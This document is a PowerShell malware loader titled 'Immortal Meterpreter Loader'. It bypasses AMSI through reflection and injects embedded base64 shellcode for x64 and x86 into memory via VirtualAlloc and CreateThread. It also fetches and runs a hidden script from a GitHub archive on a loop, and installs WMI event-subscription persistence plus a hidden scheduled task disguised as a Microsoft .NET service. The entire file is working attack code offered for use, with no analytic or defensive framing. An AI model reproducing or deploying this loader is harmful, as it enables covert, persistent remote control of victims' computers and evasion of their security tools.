# === IMMORTAL METERPRETER LOADER ===
# Enhanced AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField(
    'm_hasAmiSignatureChecked', 
    [Reflection.BindingFlags]'NonPublic,Instance'
).SetValue($ExecutionContext.InvokeCommand.NewScriptBlock(''), $true)

# Memory Injection Class
$inj = @"
using System;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress,
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        IntPtr lpThreadId
    );
    
    public static void Run(byte[] sc) {
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, mem, sc.Length);
        CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
"@

try { Add-Type -TypeDefinition $inj } catch {}

# Architecture-Aware Payloads
$shellcodes = @{
    x64 = [Convert]::FromBase64String('/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgSItSGEiLUiBWSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBQSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAPSkk7ndGUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V')
    x86 = [Convert]::FromBase64String('/OiPAAAAYDHSieVki1Iwi1IMi1IUi3IoMf8Pt0omMcCsPGF8Aiwgwc8NAcdJde9Si1IQi0I8VwHQi0B4hcB0TAHQi1ggUAHTi0gYhcl0PEkx/4s0iwHWMcDBzw2sAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/Vagpok7ndGWgCAPSkieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoZwAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0oWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCQPhXD////pm////wHDKcZ1wcO78LWiVmoAU//V')
}

# Memory-based Tar.GZ Updater
function Update-Phoenix {
    $url = "https://github.com/mitasahi/root/raw/refs/heads/main/ps-persist.ps1.tar.gz"
    
    try {
        $web = New-Object Net.WebClient
        $web.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0')
        $tarBytes = $web.DownloadData($url)
        $ms = New-Object IO.MemoryStream(,$tarBytes)
        $gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
        
        # Manual TAR extraction
        $reader = New-Object IO.BinaryReader($gz)
        while($true) {
            $header = $reader.ReadBytes(512)
            if ($header.Length -eq 0) { break }
            
            $name = [Text.Encoding]::ASCII.GetString($header[0..99]).Trim([char]0)
            $size = [Convert]::ToInt32([Text.Encoding]::ASCII.GetString($header[124..135]).Trim(), 8)
            
            if ($name -match 'ps-persist\.ps1') {
                $content = $reader.ReadBytes($size)
                $scriptContent = [Text.Encoding]::UTF8.GetString($content)
                
                # Pad to 512 block
                if ($size % 512 -ne 0) { $reader.ReadBytes(512 - ($size % 512)) | Out-Null }
                
                # Replace current instance
                $proc = Start-Process powershell.exe "-NoP -C `"$scriptContent`"" -PassThru -WindowStyle Hidden
                Stop-Process -Id $pid -Force
                break
            }
            else {
                # Skip other files
                $reader.ReadBytes($size) | Out-Null
                if ($size % 512 -ne 0) { $reader.ReadBytes(512 - ($size % 512)) | Out-Null }
            }
        }
    }
    catch { <# Silent failure #> }
    finally {
        if ($web) { $web.Dispose() }
        [GC]::Collect()
    }
}

# Persistence Engine
function Install-Phoenix {
    # WMI Resurrection
    $filter = Set-WmiInstance -Class __EventFilter -Namespace root/subscription -Arguments @{
        Name = "ProcessDeathMonitor"
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.ProcessId = $pid"
        QueryLanguage = "WQL"
    }

    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription -Arguments @{
        Name = "ProcessResurrector"
        CommandLineTemplate = "powershell -Exec Bypass -C `"Update-Phoenix`""
    }

    $null = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subscription -Arguments @{
        Filter = $filter
        Consumer = $consumer
    }

    # Hidden Scheduled Task
    $xmlTask = @'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Microsoft .NET Runtime Optimization</Description>
    <URI>\Microsoft\Windows\.NET Framework</URI>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2023-01-01T09:00:00</StartBoundary>
      <Repetition>
        <Interval>PT1M</Interval>
      </Repetition>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
  </Settings>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-Window Hidden -Exec Bypass -C "Update-Phoenix"</Arguments>
    </Exec>
  </Actions>
</Task>
'@
    $tempFile = [IO.Path]::GetTempFileName()
    $xmlTask | Out-File $tempFile -Encoding Unicode
    schtasks /Create /XML $tempFile /TN "Microsoft .NET Service" /F | Out-Null
    Remove-Item $tempFile -Force
}

# Main Execution
try {
    if (-not (Test-Path variable:__PhoenixInstalled)) {
        Install-Phoenix
        New-Variable -Name __PhoenixInstalled -Value 1 -Scope Global
    }

    # Inject shellcode
    $arch = if ([Environment]::Is64BitProcess) { "x64" } else { "x86" }
    [Injector]::Run($shellcodes[$arch])

    # Process Guardian
    Start-ThreadJob -ScriptBlock {
        while ($true) {
            if (-not (Get-Process -Id $pid -ErrorAction SilentlyContinue)) {
                Start-Process powershell.exe "-Exec Bypass -C `"Update-Phoenix`""
            }
            Start-Sleep -Seconds 5
        }
    } | Out-Null

    # Update Loop
    while ($true) {
        Update-Phoenix
        Start-Sleep -Seconds 60
    }
}
catch { exit }
